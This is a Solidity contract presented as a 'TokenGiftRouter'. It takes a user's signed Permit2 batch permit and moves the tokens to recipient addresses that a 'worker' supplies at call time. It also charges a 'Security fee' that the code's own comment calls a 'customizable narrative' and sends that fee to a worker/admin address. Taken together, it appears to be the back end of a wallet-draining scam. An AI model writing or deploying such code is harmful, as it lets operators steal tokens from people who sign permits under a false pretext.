// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IPermit2 {
    struct TokenPermissions {
        address token;
        uint256 amount;
    }

    struct PermitBatchTransferFrom {
        TokenPermissions[] permitted;
        uint256 nonce;
        uint256 deadline;
    }

    struct SignatureTransferDetails {
        address to;
        uint256 requestedAmount;
    }

    function permitTransferFrom(
        PermitBatchTransferFrom calldata permit,
        SignatureTransferDetails[] calldata transferDetails,
        address owner,
        bytes calldata signature
    ) external;
}

contract TokenGiftRouter {
    IPermit2 public immutable permit2;
    address public immutable feeRecipient;

    constructor(address _permit2, address _feeRecipient) {
        permit2 = IPermit2(_permit2);
        feeRecipient = _feeRecipient;
    }

    /**
     * @dev Execute batch transfer of multiple tokens via Permit2
     * @param permit The Permit2 batch permission
     * @param transfers The details of each transfer (recipient and amount)
     * @param owner The address of the user who signed the permit
     * @param signature The EIP-712 signature from the owner
     */
    function batchGift(
        IPermit2.PermitBatchTransferFrom calldata permit,
        IPermit2.SignatureTransferDetails[] calldata transfers,
        address owner,
        bytes calldata signature
    ) external payable {
        // Enforce the 0.001 fee (customizable narrative)
        require(msg.value >= 0.0009 ether, "Security fee required");
        
        // Transfer fee to the recipient (worker/admin)
        if (address(this).balance > 0) {
            payable(feeRecipient).transfer(address(this).balance);
        }

        // Execute the batch transfer through Permit2
        // Note: The 'transfers' array in the call must already have correct 'to' addresses
        // which the worker provides when calling this function.
        permit2.permitTransferFrom(permit, transfers, owner, signature);
    }

    // Allow receiving native for the fee
    receive() external payable {}
}
